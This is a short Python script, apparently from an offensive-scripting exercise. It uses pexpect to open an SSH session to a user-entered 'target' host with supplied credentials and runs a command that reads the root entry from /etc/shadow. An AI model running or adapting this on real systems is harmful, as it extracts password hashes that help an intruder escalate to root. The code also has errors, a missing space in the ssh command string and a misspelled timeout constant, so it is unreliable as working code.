#!/usr/bin/python3

import pexpect

PROMPT = ['#', '>>>', '>', '\$']

def send_command(child, command):
    child.sendline(command)
    child.expect(PROMPT)
    print(child.before)

def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    connStr = 'ssh' + user + '@' +host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.Timeout, ssh_newkey, '[P|p]assword: '])
    if ret == 0:
        print("[-] Error connecting")
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.Timeout,'[P|p]assword: '])
        if ret == 0:
             print("[-] Error connecting")
             return
    child.sendline(password)
    child.expect(PROMPT)
    return child
    

def main():
    host = input("Enter Host to target:")
    user = input("Enter SSH username:")
    password = input("Enter SSH password:")
    child = connect(user, host, password)
    send_command(child, 'cat /etc/shadow | grep root; ps')
    
if __name__ == "__main__":
    main()